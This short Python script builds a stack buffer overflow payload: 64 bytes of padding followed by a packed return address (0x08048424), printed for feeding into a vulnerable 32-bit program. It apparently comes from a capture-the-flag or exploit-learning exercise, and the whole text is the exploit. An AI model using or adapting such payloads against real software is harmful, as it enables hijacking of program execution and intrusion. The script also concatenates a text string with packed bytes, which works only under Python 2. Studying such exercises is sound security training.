import struct
padding = "a" * 64
address = struct.pack("I", 0x08048424)
print(padding + address)
